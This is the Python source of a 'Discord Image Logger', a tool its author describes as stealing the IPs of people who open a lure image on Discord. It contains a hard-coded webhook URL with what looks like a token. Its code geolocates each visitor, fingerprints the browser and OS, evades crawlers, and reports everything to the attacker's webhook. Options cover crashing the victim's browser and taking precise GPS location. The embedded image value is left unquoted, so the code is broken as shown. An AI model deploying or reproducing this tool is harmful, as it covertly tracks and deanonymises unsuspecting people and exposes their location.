
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1342463511527428148/oeJxTKUjO0fyYZ7a-V7xe1cqXo7aovQEoIYsEQDKoB0CZjlUfCIAWOOWL0mYAMVSchHl",
    "image": data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

